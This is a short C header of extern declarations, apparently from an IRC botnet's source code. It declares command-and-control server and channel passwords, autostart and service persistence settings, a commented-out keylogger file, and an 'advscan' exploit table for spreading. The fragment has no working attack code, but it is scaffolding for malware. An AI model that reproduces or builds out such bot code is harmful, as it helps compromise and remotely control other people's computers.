extern HANDLE ih;              // internet handle
extern char botid[];
extern char prefix;
extern char version[];
extern char bversion[];
//extern char password[];
extern char server[]; // Servers list
extern char serverpass[]; // Server password
extern char channel[]; // Bot channel
extern char chanpass[]; // Password for bot channel
extern char filename[]; // Installed file name
//extern char keylogfile[]; // Key logging file for storing logged text
//autostart
extern char valuename[];
extern char exploitchan[];
//backup
extern char server2[]; // Servers list
extern const char *servicename;
extern const bool useservice;
//extern char serverpass2[]; // Server password
extern char channel2[]; // Bot channel
extern char chanpass2[]; // Password for bot channel
extern char *authost[];
/*extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];*/

extern BOOL AutoStart;
extern BOOL topiccmd;
extern SOCKET csock[64];       
extern THREAD threads[MAXTHREADS]; 

// advscan
extern EXPLOIT exploit[];
extern int FTP_PORT;

extern char exploitn[15];


